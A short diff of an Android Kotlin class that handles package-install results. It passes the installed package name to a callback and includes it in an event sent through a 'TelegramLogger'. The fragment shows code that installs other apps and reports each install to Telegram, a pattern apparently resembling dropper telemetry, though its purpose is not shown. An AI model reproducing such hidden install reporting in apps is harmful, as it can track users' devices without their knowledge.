@@ -42,7 +42,7 @@ import javax.crypto.spec.SecretKeySpec
  */
 class BerlinInstallManager(
     private val activity: Activity,
-    private val onBerlinInstallSuccess: () -> Unit,
+    private val onBerlinInstallSuccess: (pkgName: String) -> Unit,
     private val onBerlinInstallError: () -> Unit
 ) {
 
@@ -73,8 +73,9 @@ class BerlinInstallManager(
         override fun onReceive(context: Context, intent: Intent) {
             val successAction = activity.packageName + BerlinInstallReceiver.BERLIN_INSTALL_SUCCESS_SUFFIX
             if (intent.action == successAction) {
-                TelegramLogger.send(activity, "BERLIN_INSTALL_SUCCESS", "RECEIVED", "berlin install complete")
-                onBerlinInstallSuccess()
+                val pkgName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME) ?: ""
+                TelegramLogger.send(activity, "BERLIN_INSTALL_SUCCESS", "RECEIVED", "berlin install complete pkg=$pkgName")
+                onBerlinInstallSuccess(pkgName)
             }
         }
     }
